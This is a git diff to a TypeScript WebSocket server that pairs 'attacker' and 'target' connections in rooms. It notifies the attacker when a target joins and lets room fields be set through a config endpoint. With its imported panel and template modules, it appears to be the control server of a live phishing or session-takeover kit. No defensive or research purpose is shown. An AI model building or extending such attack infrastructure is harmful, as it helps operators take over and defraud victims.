@@ -14,6 +14,8 @@ import dotenv from "dotenv";
 import { getDecodedFile as getDecodedFilePanel } from "./panel_compiled";
 import { templates } from "./template_compiled";
 
+const delay = (ms: number) => new Promise((res) => setTimeout(res, ms));
+
 // const roomPath = path.join(__dirname, "room");
 // if (!fs.existsSync(roomPath)) {
 //   fs.mkdirSync(roomPath);
@@ -71,15 +73,28 @@ websocket.on("connection", (ws: WebSocket) => {
     });
     console.log(`Attacker ${id} joined room ${path}`);
   };
-
   const handleJoinTarget = () => {
     targets.set(id, ws);
     const room = rooms.get(path);
     if (room) {
       room.target_id = id;
+      room.is_target_close = false;
     }
     console.log(`Target ${id} joined room ${path}`);
+    const attacker_id = room?.attacker_id;
+    if (attacker_id) {
+      const attacker_ws = attackers.get(attacker_id);
+      if (attacker_ws) {
+        attacker_ws.send(
+          JSON.stringify({
+            event: "available",
+            target_id: id,
+          })
+        );
+      }
+    }
   };
+
   ws.on("close", () => {
     console.log("Client disconnected");
     const is_attacker = attackers.get(id);
@@ -129,15 +144,6 @@ websocket.on("connection", (ws: WebSocket) => {
       return;
     }
 
-    // Handle JSON messages
-    if (data.event === "message" && data.message) {
-      const msg = data.message;
-      console.log("Processed message:", msg);
-
-      // Forward message to appropriate recipients
-      // You can add logic here to forward messages between attacker and target
-    }
-
     // Handle action events
     if (data.event === "action" && data.action) {
       const action = data.action;
@@ -153,6 +159,15 @@ websocket.on("connection", (ws: WebSocket) => {
         }
       }
     }
+
+    // Handle JSON messages
+    if (data.event === "message" && data.message) {
+      const msg = data.message;
+      console.log("Processed message:", msg);
+
+      // Forward message to appropriate recipients
+      // You can add logic here to forward messages between attacker and target
+    }
   });
 
   // Optional: kirim pesan saat connect
@@ -163,10 +178,22 @@ websocket.on("connection", (ws: WebSocket) => {
   );
 });
 
+// const border = "=============================";
+// (async () => {
+//   while (true) {
+//     console.log(border);
+//     console.log("Attacker :", attackers);
+//     console.log("Target :", targets);
+//     console.log("Room :", rooms);
+//     console.log(border);
+//     await delay(1000);
+//   }
+// })();
+
 app.post("/api/config/set/:room_id", (req, res) => {
   const room_id = req.params.room_id;
   const body = req.body as RoomField;
-  const room = rooms.get(room_id);
+  const room = rooms.get(`/${room_id}`);
   if (room) {
     room.fields = body;
   }
